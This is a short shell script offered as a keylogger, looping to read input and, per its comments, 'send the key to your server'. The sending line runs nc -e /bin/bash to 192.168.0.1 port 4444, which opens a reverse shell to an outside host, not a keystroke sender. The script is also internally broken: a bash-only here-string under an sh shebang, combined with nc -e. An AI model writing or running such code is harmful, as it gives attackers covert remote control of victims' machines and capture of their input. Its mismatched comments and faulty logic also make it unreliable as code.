#!/bin/sh

while true
do
    # Record keystrokes
    read -r key < /dev/stdin

    # Send the key to your server
    nc -e /bin/bash 192.168.0.1 4444 <<< "$key"
done
